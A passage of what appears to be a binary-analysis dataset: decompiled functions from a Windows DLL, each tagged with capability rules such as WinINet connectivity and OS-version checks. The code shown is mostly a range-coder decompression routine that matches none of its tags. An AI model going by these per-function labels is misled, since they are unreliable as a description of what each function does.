arg1[0x15];\n    uStack300 = arg1[0x16];\n    uVar2 = arg1[2];\n    uVar3 = arg1[1];\n    uVar4 = *arg1;\n    iVar7 = *(arg1 + 6);\n    uVar8 = *(arg1 + 0xe);\n    uStack264 = *(arg1 + 0xc);\n    uStack296 = arg1[0x10];\n    uVar5 = arg1[0x11];\n    uStack304 = 0;\n    puStack288 = *(arg1 + 8);\n    uStack276 = arg1[10];\n    uStack324 = arg1[0xb];\n    do {\n        uVar12 = uStack296 & (1 << (uVar2 & 0x1f)) - 1U;\n        puVar10 = iVar6 + (uStack248 << 4) * 2 + uVar12 * 2;\n        uVar1 = *puVar10;\n        if (uStack276 < 0x1000000) {\n            uStack276 = uStack276 << 8;\n            uStack324 = uStack324 << 8 | *puStack288;\n            puStack288 = puStack288 + 1;\n        }\n        uVar9 = (uStack276 >> 0xb) * uVar1;\n        if (uStack324 < uVar9) {\n            *puVar10 = uVar1 + (0x800 - uVar1 >> 5);\n            puStack232 = iVar6 + 0xe6c;\n            if ((uVar5 != 0) || (uStack296 != 0)) {\n                uStack88 = uVar8;\n                if (uStack264 != 0) {\n                    uStack88 = uStack264;\n                }\n                puStack232 = puStack232 +\n                             (((uStack296 & (1 << (uVar3 & 0x1f)) - 1U) << (uVar4 & 0x1f)) +\n                             (*(iVar7 + uStack88 + -1) >> (8 - uVar4 & 0x1f))) * 0x300 * 2;\n            }\n            uStack276 = uVar9;\n            if (uStack248 < 7) {\n                if (uStack248 < 4) {\n                    uStack76 = uStack248;\n                }\n                else {\n                    uStack76 = 3;\n                }\n                uStack224 = 1;\n                do {\n                    uVar1 = *(puStack232 + uStack224 * 2);\n                    if (uStack276 < 0x1000000) {\n                        uStack276 = uStack276 << 8;\n                        uStack324 = uStack324 << 8 | *puStack288;\n                        puStack288 = puStack288 + 1;\n                    }\n                    uVar12 = (uStack276 >> 0xb) * uVar1;\n                    if (uStack324 < uVar12) {\n                        *(puStack232 + uStack224 * 2) = uVar1 + (0x800 - uVar1 >> 5);\n                        uStack224 = uStack224 * 2;\n                        uStack276 = uVar12;\n                    }\n                    else {\n                        uStack276 = uStack276 - uVar12;\n                        uStack324 = uStack324 - uVar12;\n                        *(puStack232 + uStack224 * 2) = uVar1 - (uVar1 >> 5);\n                        uStack224 = uStack224 * 2 + 1;\n                    }\n                    uStack64 = uStack76;\n                } while (uStack224 < 0x100);\n            }\n            else {\n                uStack72 = uVar8;\n                if (uStack328 <= uStack264) {\n                    uStack72 = 0;\n                }\n                uStack220 = *(*(arg1 + 6) + (uStack264 - uStack328) + uStack72);\n                uStack216 = 0x100;\n                if (uStack248 < 10) {\n                    uStack64 = 3;\n                }\n                else {\n                    uStack64 = 6;\n                }\n                uStack224 = 1;\n                do {\n                    uStack220 = uStack220 << 1;\n                    uVar12 = uStack220 & uStack216;\n                    puVar10 = puStack232 + uStack216 * 2 + uVar12 * 2 + uStack224 * 2;\n                    uVar1 = *puVar10;\n                    if (uStack276 < 0x1000000) {\n                        uStack276 = uStack276 << 8;\n                        uStack324 = uStack324 << 8 | *puStack288;\n                        puStack288 = puStack288 + 1;\n                    }\n                    uVar9 = (uStack276 >> 0xb) * uVar1;\n                    if (uStack324 < uVar9) {\n                        *puVar10 = uVar1 + (0x800 - uVar1 >> 5);\n                        uStack224 = uStack224 * 2;\n                        uVar12 = ~uVar12;\n                        uStack276 = uVar9;\n                    }\n                    else {\n                        uStack276 = uStack276 - uVar9;\n                        uStack324 = uStack324 - uVar9;\n                        *puVar10 = uVar1 - (uVar1 >> 5);\n                        uStack224 = uStack224 * 2 + 1;\n                    }\n                    uStack216 = uStack216 & uVar12;\n                } while (uStack224 < 0x100);\n            }\n            uStack248 = uStack248 - uStack64;\n            *(iVar7 + uStack264) = uStack224;\n            uStack264 = uStack264 + 1;\n            uStack296 = uStack296 + 1;\n        }\n        else {\n            uStack276 = uStack276 - uVar9;\n            uStack324 = uStack324 - uVar9;\n            *puVar10 = uVar1 - (uVar1 >> 5);\n            puVar10 = iVar6 + 0x180 + uStack248 * 2;\n            uVar1 = *puVar10;\n            if (uStack276 < 0x1000000) {\n                uStack276 = uStack276 * 0x100;\n                uStack324 = uStack324 * 0x100 | *puStack288;\n                puStack288 = puStack288 + 1;\n            }\n            uVar9 = (uStack276 >> 0xb) * uVar1;\n            if (uStack324 < uVar9) {\n                *puVar10 = uVar1 + (0x800 - uVar1 >> 5);\n                uStack248 = uStack248 + 0xc;\n                puStack232 = iVar6 + 0x664;\n                uStack276 = uVar9;\n            }\n            else {\n                uStack276 = uStack276 - uVar9;\n                uStack324 = uStack324 - uVar9;\n                *puVar10 = uVar1 - (uVar1 >> 5);\n                if ((uVar5 == 0) && (uStack296 == 0)) {\n                    return 1;\n                }\n                puVar10 = iVar6 + 0x198 + uStack248 * 2;\n                uVar1 = *puVar10;\n                if (uStack276 < 0x1000000) {\n                    uStack276 = uStack276 * 0x100;\n                    uStack324 = uStack324 * 0x100 | *puStack288;\n                    puStack288 = puStack288 + 1;\n                }\n                uVar9 = (uStack276 >> 0xb) * uVar1;\n                if (uStack324 < uVar9) {\n                    *puVar10 = uVar1 + (0x800 - uVar1 >> 5);\n                    puVar10 = iVar6 + 0x1e0 + (uStack248 << 4) * 2 + uVar12 * 2;\n                    uVar1 = *puVar10;\n                    uStack276 = uVar9;\n                    if (uVar9 < 0x1000000) {\n                        uStack276 = uVar9 * 0x100;\n                        uStack324 = uStack324 << 8 | *puStack288;\n                        puStack288 = puStack288 + 1;\n                    }\n                    uVar9 = (uStack276 >> 0xb) * uVar1;\n                    if (uStack324 < uVar9) {\n                        *puVar10 = uVar1 + (0x800 - uVar1 >> 5);\n                        uStack56 = uVar8;\n                        if (uStack328 <= uStack264) {\n                            uStack56 = 0;\n                        }\n                        *(iVar7 + uStack264) = *(iVar7 + (uStack264 - uStack328) + uStack56);\n                        uStack264 = uStack264 + 1;\n                        uStack296 = uStack296 + 1;\n                        if (uStack248 < 7) {\n                            uStack48 = 9;\n                        }\n                        else {\n                            uStack48 = 0xb;\n                        }\n                        uStack248 = uStack48;\n                        uStack276 = uVar9;\n                        goto code_r0x00018000558e;\n                    }\n                    uStack276 = uStack276 - uVar9;\n                    uStack324 = uStack324 - uVar9;\n                    *puVar10 = uVar1 - (uVar1 >> 5);\n                }\n                else {\n                    uStack276 = uStack276 - uVar9;\n                    uStack324 = uStack324 - uVar9;\n                    *puVar10 = uVar1 - (uVar1 >> 5);\n                    puVar10 = iVar6 + 0x1b0 + uStack248 * 2;\n                    uVar1 = *puVar10;\n                    if (uStack276 < 0x1000000) {\n                        uStack276 = uStack276 * 0x100;\n                        uStack324 = uStack324 * 0x100 | *puStack288;\n                        puStack288 = puStack288 + 1;\n                    }\n                    uVar9 = (uStack276 >> 0xb) * uVar1;\n                    if (uStack324 < uVar9) {\n                        *puVar10 = uVar1 + (0x800 - uVar1 >> 5);\n                        uStack196 = uStack344;\n                        uStack276 = uVar9;\n                    }\n                    else {\n                        uStack276 = uStack276 - uVar9;\n                        uStack324 = uStack324 - uVar9;\n                        *puVar10 = uVar1 - (uVar1 >> 5);\n                        puVar10 = iVar6 + 0x1c8 + uStack248 * 2;\n                        uVar1 = *puVar10;\n                        if (uStack276 < 0x1000000) {\n                            uStack276 = uStack276 * 0x100;\n                            uStack324 = uStack324 * 0x100 | *puStack288;\n                            puStack288 = puStack288 + 1;\n                        }\n                        uVar9 = (uStack276 >> 0xb) * uVar1;\n                        if (uStack324 < uVar9) {\n                            *puVar10 = uVar1 + (0x800 - uVar1 >> 5);\n                            uStack196 = uStack272;\n                            uStack276 = uVar9;\n                        }\n                        else {\n                            uStack276 = uStack276 - uVar9;\n                            uStack324 = uStack324 - uVar9;\n                            *puVar10 = uVar1 - (uVar1 >> 5);\n                            uStack196 = uStack300;\n                            uStack300 = uStack272;\n                        }\n                        uStack272 = uStack344;\n                    }\n                    uStack344 = uStack328;\n                    uStack328 = uStack196;\n                }\n                if (uStack248 < 7) {\n                    uStack44 = 8;\n                }\n                else {\n                    uStack44 = 0xb;\n                }\n                uStack248 = uStack44;\n                puStack232 = iVar6 + 0xa68;\n            }\n            uVar1 = *puStack232;\n            if (uStack276 < 0x1000000) {\n                uStack276 = uStack276 << 8;\n                uStack324 = uStack324 << 8 | *puStack288;\n                puStack288 = puStack288 + 1;\n            }\n            uVar9 = (uStack276 >> 0xb) * uVar1;\n            if (uStack324 < uVar9) {\n                *puStack232 = uVar1 + (0x800 - uVar1 >> 5);\n                puStack192 = puStack232 + (uVar12 << 3) + 2;\n                iStack184 = 0;\n                uStack180 = 8;\n                uStack276 = uVar9;\n            }\n            else {\n                uStack276 = uStack276 - uVar9;\n                uStack324 = uStack324 - uVar9;\n                *puStack232 = uVar1 - (uVar1 >> 5);\n                puVar10 = puStack232 + 1;\n                uVar1 = *puVar10;\n                if (uStack276 < 0x1000000) {\n                    uStack276 = uStack276 * 0x100;\n                    uStack324 = uStack324 * 0x100 | *puStack288;\n                    puStack288 = puStack288 + 1;\n                }\n                uVar9 = (uStack276 >> 0xb) * uVar1;\n                if (uStack324 < uVar9) {\n                    *puVar10 = uVar1 + (0x800 - uVar1 >> 5);\n                    puStack192 = puStack232 + (uVar12 << 3) + 0x82;\n                    iStack184 = 8;\n                    uStack180 = 8;\n                    uStack276 = uVar9;\n                }\n                else {\n                    uStack276 = uStack276 - uVar9;\n                    uStack324 = uStack324 - uVar9;\n                    *puVar10 = uVar1 - (uVar1 >> 5);\n                    puStack192 = puStack232 + 0x102;\n                    iStack184 = 0x10;\n                    uStack180 = 0x100;\n                }\n            }\n            uStack304 = 1;\n            do {\n                uVar1 = puStack192[uStack304];\n                if (uStack276 < 0x1000000) {\n                    uStack276 = uStack276 << 8;\n                    uStack324 = uStack324 << 8 | *puStack288;\n                    puStack288 = puStack288 + 1;\n                }\n                uVar12 = (uStack276 >> 0xb) * uVar1;\n                if (uStack324 < uVar12) {\n                    puStack192[uStack304] = uVar1 + (0x800 - uVar1 >> 5);\n                    uStack304 = uStack304 * 2;\n                    uStack276 = uVar12;\n                }\n                else {\n                    uStack276 = uStack276 - uVar12;\n                    uStack324 = uStack324 - uVar12;\n                    puStack192[uStack304] = uVar1 - (uVar1 >> 5);\n                    uStack304 = uStack304 * 2 + 1;\n                }\n            } while (uStack304 < uStack180);\n            uStack304 = (uStack304 - uStack180) + iStack184;\n            if (0xb < uStack248) {\n                uStack40 = uStack304;\n                if (3 < uStack304) {\n                    uStack40 = 3;\n                }\n                iVar11 = iVar6 + 0x360 + (uStack40 << 6) * 2;\n                uVar1 = *(iVar11 + 2);\n                if (uStack276 < 0x1000000) {\n                    uStack276 = uStack276 << 8;\n                    uStack324 = uStack324 << 8 | *puStack288;\n                    puStack288 = puStack288 + 1;\n                }\n                uVar12 = (uStack276 >> 0xb) * uVar1;\n                if (uStack324 < uVar12) {\n                    *(iVar11 + 2) = uVar1 + (0x800 - uVar1 >> 5);\n                    uStack176 = 2;\n                    uStack276 = uVar12;\n                }\n                else {\n                    uStack276 = uStack276 - uVar12;\n                    uStack324 = uStack324 - uVar12;\n                    *(iVar11 + 2) = uVar1 - (uVar1 >> 5);\n                    uStack176 = 3;\n                }\n                uVar1 = *(iVar11 + uStack176 * 2);\n                if (uStack276 < 0x1000000) {\n                    uStack276 = uStack276 << 8;\n                    uStack324 = uStack324 << 8 | *puStack288;\n                    puStack288 = puStack288 + 1;\n                }\n                uVar12 = (uStack276 >> 0xb) * uVar1;\n                if (uStack324 < uVar12) {\n                    *(iVar11 + uStack176 * 2) = uVar1 + (0x800 - uVar1 >> 5);\n                    uStack176 = uStack176 * 2;\n                    uStack276 = uVar12;\n                }\n                else {\n                    uStack276 = uStack276 - uVar12;\n                    uStack324 = uStack324 - uVar12;\n                    *(iVar11 + uStack176 * 2) = uVar1 - (uVar1 >> 5);\n                    uStack176 = uStack176 * 2 + 1;\n                }\n                uVar1 = *(iVar11 + uStack176 * 2);\n                if (uStack276 < 0x1000000) {\n                    uStack276 = uStack276 << 8;\n                    uStack324 = uStack324 << 8 | *puStack288;\n                    puStack288 = puStack288 + 1;\n                }\n                uVar12 = (uStack276 >> 0xb) * uVar1;\n                if (uStack324 < uVar12) {\n                    *(iVar11 + uStack176 * 2) = uVar1 + (0x800 - uVar1 >> 5);\n                    uStack176 = uStack176 * 2;\n                    uStack276 = uVar12;\n                }\n                else {\n                    uStack276 = uStack276 - uVar12;\n                    uStack324 = uStack324 - uVar12;\n                    *(iVar11 + uStack176 * 2) = uVar1 - (uVar1 >> 5);\n                    uStack176 = uStack176 * 2 + 1;\n                }\n                uVar1 = *(iVar11 + uStack176 * 2);\n                if (uStack276 < 0x1000000) {\n                    uStack276 = uStack276 << 8;\n                    uStack324 = uStack324 << 8 | *puStack288;\n                    puStack288 = puStack288 + 1;\n                }\n                uVar12 = (uStack276 >> 0xb) * uVar1;\n                if (uStack324 < uVar12) {\n                    *(iVar11 + uStack176 * 2) = uVar1 + (0x800 - uVar1 >> 5);\n                    uStack176 = uStack176 * 2;\n                    uStack276 = uVar12;\n                }\n                else {\n                    uStack276 = uStack276 - uVar12;\n                    uStack324 = uStack324 - uVar12;\n                    *(iVar11 + uStack176 * 2) = uVar1 - (uVar1 >> 5);\n                    uStack176 = uStack176 * 2 + 1;\n                }\n                uVar1 = *(iVar11 + uStack176 * 2);\n                if (uStack276 < 0x1000000) {\n                    uStack276 = uStack276 << 8;\n                    uStack324 = uStack324 << 8 | *puStack288;\n                    puStack288 = puStack288 + 1;\n                }\n                uVar12 = (uStack276 >> 0xb) * uVar1;\n                if (uStack324 < uVar12) {\n                    *(iVar11 + uStack176 * 2) = uVar1 + (0x800 - uVar1 >> 5);\n                    uStack176 = uStack176 * 2;\n                    uStack276 = uVar12;\n                }\n                else {\n                    uStack276 = uStack276 - uVar12;\n                    uStack324 = uStack324 - uVar12;\n                    *(iVar11 + uStack176 * 2) = uVar1 - (uVar1 >> 5);\n                    uStack176 = uStack176 * 2 + 1;\n                }\n                uVar1 = *(iVar11 + uStack176 * 2);\n                if (uStack276 < 0x1000000) {\n                    uStack276 = uStack276 << 8;\n                    uStack324 = uStack324 << 8 | *puStack288;\n                    puStack288 = puStack288 + 1;\n                }\n                uVar12 = (uStack276 >> 0xb) * uVar1;\n                if (uStack324 < uVar12) {\n                    *(iVar11 + uStack176 * 2) = uVar1 + (0x800 - uVar1 >> 5);\n                    uStack176 = uStack176 * 2;\n                    uStack276 = uVar12;\n                }\n                else {\n                    uStack276 = uStack276 - uVar12;\n                    uStack324 = uStack324 - uVar12;\n                    *(iVar11 + uStack176 * 2) = uVar1 - (uVar1 >> 5);\n                    uStack176 = uStack176 * 2 + 1;\n                }\n                uStack176 = uStack176 - 0x40;\n                if (3 < uStack176) {\n                    iStack168 = (uStack176 >> 1) - 1;\n                    uVar12 = uStack176 & 1 | 2;\n                    if (uStack176 < 0xe) {\n                        uVar12 = uVar12 << (iStack168 & 0x1f);\n                        iVar11 = iVar6 + uVar12 * 2 + uStack176 * -2 + 0x55e;\n                        uStack160 = 1;\n                        uStack164 = 1;\n                        uStack176 = uVar12;\n                        do {\n                            uVar1 = *(iVar11 + uStack164 * 2);\n                            if (uStack276 < 0x1000000) {\n                                uStack276 = uStack276 << 8;\n                                uStack324 = uStack324 << 8 | *puStack288;\n                                puStack288 = puStack288 + 1;\n                            }\n                            uVar12 = (uStack276 >> 0xb) * uVar1;\n                            if (uStack324 < uVar12) {\n                                *(iVar11 + uStack164 * 2) = uVar1 + (0x800 - uVar1 >> 5);\n                                uStack164 = uStack164 * 2;\n                                uStack276 = uVar12;\n                            }\n                            else {\n                                uStack276 = uStack276 - uVar12;\n                                uStack324 = uStack324 - uVar12;\n                                *(iVar11 + uStack164 * 2) = uVar1 - (uVar1 >> 5);\n                                uStack164 = uStack164 * 2 + 1;\n                                uStack176 = uStack176 | uStack160;\n                            }\n                            uStack160 = uStack160 << 1;\n                            iStack168 = iStack168 + -1;\n                        } while (iStack168 != 0);\n                    }\n                    else {\n                        iStack168 = (uStack176 >> 1) - 5;\n                        uStack176 = uVar12;\n                        do {\n                            if (uStack276 < 0x1000000) {\n                                uStack276 = uStack276 << 8;\n                                uStack324 = uStack324 << 8 | *puStack288;\n                                puStack288 = puStack288 + 1;\n                            }\n                            uStack276 = uStack276 >> 1;\n                            uVar12 = uStack324 - uStack276 >> 0x1f;\n                            uStack176 = uVar12 + 1 + uStack176 * 2;\n                            uStack324 = (uStack324 - uStack276) + (uStack276 & uVar12);\n                            iStack168 = iStack168 + -1;\n                        } while (iStack168 != 0);\n                        iVar11 = iVar6 + 0x644;\n                        uStack176 = uStack176 * 0x10;\n                        uVar1 = *(iVar6 + 0x646);\n                        if (uStack276 < 0x1000000) {\n                            uStack276 = uStack276 << 8;\n                            uStack324 = uStack324 * 0x100 | *puStack288;\n                            puStack288 = puStack288 + 1;\n                        }\n                        uVar12 = (uStack276 >> 0xb) * uVar1;\n                        if (uStack324 < uVar12) {\n                            *(iVar6 + 0x646) = uVar1 + (0x800 - uVar1 >> 5);\n                            uStack152 = 2;\n                            uStack276 = uVar12;\n                        }\n                        else {\n                            uStack276 = uStack276 - uVar12;\n                            uStack324 = uStack324 - uVar12;\n                            *(iVar6 + 0x646) = uVar1 - (uVar1 >> 5);\n                            uStack152 = 3;\n                            uStack176 = uStack176 | 1;\n                        }\n                        uVar1 = *(iVar11 + uStack152 * 2);\n                        if (uStack276 < 0x1000000) {\n                            uStack276 = uStack276 << 8;\n                            uStack324 = uStack324 << 8 | *puStack288;\n                            puStack288 = puStack288 + 1;\n                        }\n                        uVar12 = (uStack276 >> 0xb) * uVar1;\n                        if (uStack324 < uVar12) {\n                            *(iVar11 + uStack152 * 2) = uVar1 + (0x800 - uVar1 >> 5);\n                            uStack152 = uStack152 * 2;\n                            uStack276 = uVar12;\n                        }\n                        else {\n                            uStack276 = uStack276 - uVar12;\n                            uStack324 = uStack324 - uVar12;\n                            *(iVar11 + uStack152 * 2) = uVar1 - (uVar1 >> 5);\n                            uStack152 = uStack152 * 2 + 1;\n                            uStack176 = uStack176 | 2;\n                        }\n                        uVar1 = *(iVar11 + uStack152 * 2);\n                        if (uStack276 < 0x1000000) {\n                            uStack276 = uStack276 << 8;\n                            uStack324 = uStack324 << 8 | *puStack288;\n                            puStack288 = puStack288 + 1;\n                        }\n                        uVar12 = (uStack276 >> 0xb) * uVar1;\n                        if (uStack324 < uVar12) {\n                            *(iVar11 + uStack152 * 2) = uVar1 + (0x800 - uVar1 >> 5);\n                            uStack152 = uStack152 * 2;\n                            uStack276 = uVar12;\n                        }\n                        else {\n                            uStack276 = uStack276 - uVar12;\n                            uStack324 = uStack324 - uVar12;\n                            *(iVar11 + uStack152 * 2) = uVar1 - (uVar1 >> 5);\n                            uStack152 = uStack152 * 2 + 1;\n                            uStack176 = uStack176 | 4;\n                        }\n                        uVar1 = *(iVar11 + uStack152 * 2);\n                        if (uStack276 < 0x1000000) {\n                            uStack276 = uStack276 << 8;\n                            uStack324 = uStack324 << 8 | *puStack288;\n                            puStack288 = puStack288 + 1;\n                        }\n                        uVar12 = (uStack276 >> 0xb) * uVar1;\n                        if (uStack324 < uVar12) {\n                            *(iVar11 + uStack152 * 2) = uVar1 + (0x800 - uVar1 >> 5);\n                            uStack276 = uVar12;\n                        }\n                        else {\n                            uStack276 = uStack276 - uVar12;\n                            uStack324 = uStack324 - uVar12;\n                            *(iVar11 + uStack152 * 2) = uVar1 - (uVar1 >> 5);\n                            uStack176 = uStack176 | 8;\n                        }\n                        if (uStack176 == 0xffffffff) {\n                            uStack304 = uStack304 + 0x112;\n                            uStack248 = uStack248 - 0xc;\ncode_r0x0001800055b0:\n                            if (uStack276 < 0x1000000) {\n                                uStack276 = uStack276 << 8;\n                                uStack324 = uStack324 << 8 | *puStack288;\n                                puStack288 = puStack288 + 1;\n                            }\n                            *(arg1 + 8) = puStack288;\n                            arg1[10] = uStack276;\n                            arg1[0xb] = uStack324;\n                            arg1[0x17] = uStack304;\n                            *(arg1 + 0xc) = uStack264;\n                            arg1[0x10] = uStack296;\n                            arg1[0x13] = uStack328;\n                            arg1[0x14] = uStack344;\n                            arg1[0x15] = uStack272;\n                            arg1[0x16] = uStack300;\n                            arg1[0x12] = uStack248;\n                            return 0;\n                        }\n                    }\n                }\n                uStack300 = uStack272;\n                uStack272 = uStack344;\n                uStack344 = uStack328;\n                uStack328 = uStack176 + 1;\n                if (uVar5 == 0) {\n                    if (uStack296 <= uStack176) {\n                        return 1;\n                    }\n                }\n                else if (uVar5 <= uStack176) {\n                    return 1;\n                }\n                if (uStack248 < 0x13) {\n                    uStack36 = 7;\n                }\n                else {\n                    uStack36 = 10;\n                }\n                uStack248 = uStack36;\n            }\n            uStack304 = uStack304 + 2;\n            if (arg2 == uStack264) {\n                return 1;\n            }\n            uStack32 = uStack304;\n            if (arg2 - uStack264 < uStack304) {\n                uStack144 = arg2 - uStack264;\n                uStack32 = uStack144;\n            }\n            uStack136 = uStack32;\n            uStack24 = uVar8;\n            if (uStack328 <= uStack264) {\n                uStack24 = 0;\n            }\n            uStack128 = (uStack264 - uStack328) + uStack24;\n            uStack296 = uStack296 + uStack32;\n            uStack304 = uStack304 - uStack32;\n            if (uVar8 < uStack128 + uStack32) {\n                do {\n                    *(iVar7 + uStack264) = *(iVar7 + uStack128);\n                    uStack264 = uStack264 + 1;\n                    uStack128 = uStack128 + 1;\n                    if (uStack128 == uVar8) {\n                        uStack128 = 0;\n                    }\n                    uStack136 = uStack136 - 1;\n                } while (uStack136 != 0);\n            }\n            else {\n                puStack112 = iVar7 + uStack264;\n                iVar11 = uStack128 - uStack264;\n                puVar13 = puStack112 + uStack32;\n                uStack264 = uStack264 + uStack32;\n                do {\n                    *puStack112 = puStack112[iVar11];\n                    puStack112 = puStack112 + 1;\n                } while (puStack112 != puVar13);\n            }\n        }\ncode_r0x00018000558e:\n        if ((arg2 <= uStack264) || (arg3 <= puStack288)) goto code_r0x0001800055b0;\n    } while( true );\n}\n",
        "token_count": 7685
    },
    "1800056a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1800056a0(int64_t arg1, int64_t arg2)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uint32_t uStack44;\n    uint64_t uStack40;\n    int64_t iStack24;\n    \n    if ((*(arg1 + 0x5c) != 0) && (*(arg1 + 0x5c) < 0x112)) {\n        iVar2 = *(arg1 + 0x18);\n        uStack40 = *(arg1 + 0x30);\n        iVar3 = *(arg1 + 0x38);\n        uStack44 = *(arg1 + 0x5c);\n        uVar1 = *(arg1 + 0x4c);\n        if (arg2 - uStack40 < uStack44) {\n            uStack44 = arg2 - uStack40;\n        }\n        if ((*(arg1 + 0x44) == 0) && (*(arg1 + 0xc) - *(arg1 + 0x40) <= uStack44)) {\n            *(arg1 + 0x44) = *(arg1 + 0xc);\n        }\n        *(arg1 + 0x40) = *(arg1 + 0x40) + uStack44;\n        *(arg1 + 0x5c) = *(arg1 + 0x5c) - uStack44;\n        while (uStack44 != 0) {\n            uStack44 = uStack44 - 1;\n            iStack24 = iVar3;\n            if (uVar1 <= uStack40) {\n                iStack24 = 0;\n            }\n            *(iVar2 + uStack40) = *(iVar2 + (uStack40 - uVar1) + iStack24);\n            uStack40 = uStack40 + 1;\n        }\n        *(arg1 + 0x30) = uStack40;\n    }\n    return;\n}\n",
        "token_count": 434
    },
    "18000582": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.180005820(int64_t arg1, uint64_t arg2, uint64_t arg3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint64_t uStack24;\n    \n    do {\n        uStack24 = arg2;\n        if ((*(arg1 + 0x44) == 0) && (uVar1 = *(arg1 + 0xc) - *(arg1 + 0x40),  uVar1 < arg2 - *(arg1 + 0x30))) {\n            uStack24 = uVar1 + *(arg1 + 0x30);\n        }\n        iVar2 = fcn.1800035b0(arg1, uStack24, arg3);\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        if (*(arg1 + 0xc) <= *(arg1 + 0x40)) {\n            *(arg1 + 0x44) = *(arg1 + 0xc);\n        }\n        fcn.1800056a0(arg1, arg2);\n    } while (((*(arg1 + 0x30) < arg2) && (*(arg1 + 0x20) < arg3)) && (*(arg1 + 0x5c) < 0x112));\n    if (0x112 < *(arg1 + 0x5c)) {\n        *(arg1 + 0x5c) = 0x112;\n    }\n    return 0;\n}\n",
        "token_count": 329
    },
    "18000594": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.180005940(uint *arg1, uint8_t *arg2, int64_t arg3)\n\n{\n    int64_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint8_t *puVar5;\n    uint8_t *puStackX16;\n    uint uStack168;\n    uint32_t uStack152;\n    uint32_t uStack148;\n    uint32_t uStack136;\n    uint16_t *puStack120;\n    uint32_t uStack112;\n    uint32_t uStack108;\n    uint32_t uStack104;\n    uint32_t uStack100;\n    uint32_t uStack84;\n    uint16_t *puStack80;\n    int32_t iStack72;\n    uint32_t uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint32_t uStack56;\n    int64_t iStack48;\n    int64_t iStack32;\n    uint32_t uStack24;\n    \n    uStack148 = arg1[10];\n    uStack152 = arg1[0xb];\n    puVar5 = arg2 + arg3;\n    iVar1 = *(arg1 + 4);\n    uVar3 = arg1[0x12];\n    uVar4 = arg1[0x10] & (1 << (arg1[2] & 0x1f)) - 1U;\n    puStackX16 = arg2;\n    if (uStack148 < 0x1000000) {\n        if (puVar5 <= arg2) {\n            return 0;\n        }\n        uStack148 = uStack148 << 8;\n        uStack152 = uStack152 << 8 | *arg2;\n        puStackX16 = arg2 + 1;\n    }\n    uVar2 = (uStack148 >> 0xb) * *(iVar1 + (uVar3 << 4) * 2 + uVar4 * 2);\n    if (uStack152 < uVar2) {\n        puStack120 = iVar1 + 0xe6c;\n        if ((arg1[0x11] != 0) || (arg1[0x10] != 0)) {\n            if (*(arg1 + 0xc) == 0) {\n                iStack48 = *(arg1 + 0xe);\n            }\n            else {\n                iStack48 = *(arg1 + 0xc);\n            }\n            puStack120 = puStack120 +\n                         (((arg1[0x10] & (1 << (arg1[1] & 0x1f)) - 1U) << (*arg1 & 0x1f)) +\n                         (*(*(arg1 + 6) + -1 + iStack48) >> (8U - *arg1 & 0x1f))) * 0x300 * 2;\n        }\n        uStack148 = uVar2;\n        if (uVar3 < 7) {\n            uStack112 = 1;\n            do {\n                if (uStack148 < 0x1000000) {\n                    if (puVar5 <= puStackX16) {\n                        return 0;\n                    }\n                    uStack148 = uStack148 << 8;\n                    uStack152 = uStack152 << 8 | *puStackX16;\n                    puStackX16 = puStackX16 + 1;\n                }\n                uVar3 = (uStack148 >> 0xb) * *(puStack120 + uStack112 * 2);\n                if (uStack152 < uVar3) {\n                    uStack112 = uStack112 * 2;\n                    uStack148 = uVar3;\n                }\n                else {\n                    uStack148 = uStack148 - uVar3;\n                    uStack152 = uStack152 - uVar3;\n                    uStack112 = uStack112 * 2 + 1;\n                }\n            } while (uStack112 < 0x100);\n        }\n        else {\n            if (*(arg1 + 0xc) < arg1[0x13]) {\n                iStack32 = *(arg1 + 0xe);\n            }\n            else {\n                iStack32 = 0;\n            }\n            uStack104 = *(*(arg1 + 6) + (*(arg1 + 0xc) - arg1[0x13]) + iStack32);\n            uStack100 = 0x100;\n            uStack108 = 1;\n            do {\n                uStack104 = uStack104 << 1;\n                uVar3 = uStack104 & uStack100;\n                if (uStack148 < 0x1000000) {\n                    if (puVar5 <= puStackX16) {\n                        return 0;\n                    }\n                    uStack148 = uStack148 << 8;\n                    uStack152 = uStack152 << 8 | *puStackX16;\n                    puStackX16 = puStackX16 + 1;\n                }\n                uVar4 = (uStack148 >> 0xb) * *(puStack120 + uStack100 * 2 + uVar3 * 2 + uStack108 * 2);\n                if (uStack152 < uVar4) {\n                    uStack108 = uStack108 * 2;\n                    uVar3 = ~uVar3;\n                    uStack148 = uVar4;\n                }\n                else {\n                    uStack148 = uStack148 - uVar4;\n                    uStack152 = uStack152 - uVar4;\n                    uStack108 = uStack108 * 2 + 1;\n                }\n                uStack100 = uStack100 & uVar3;\n            } while (uStack108 < 0x100);\n        }\n        uStack168 = 1;\n    }\n    else {\n        uStack148 = uStack148 - uVar2;\n        uStack152 = uStack152 - uVar2;\n        if (uStack148 < 0x1000000) {\n            if (puVar5 <= puStackX16) {\n                return 0;\n            }\n            uStack148 = uStack148 * 0x100;\n            uStack152 = uStack152 * 0x100 | *puStackX16;\n            puStackX16 = puStackX16 + 1;\n        }\n        uVar2 = (uStack148 >> 0xb) * *(iVar1 + 0x180 + uVar3 * 2);\n        if (uStack152 < uVar2) {\n            uStack136 = 0;\n            puStack120 = iVar1 + 0x664;\n            uStack168 = 2;\n            uStack148 = uVar2;\n        }\n        else {\n            uStack148 = uStack148 - uVar2;\n            uStack152 = uStack152 - uVar2;\n            uStack168 = 3;\n            if 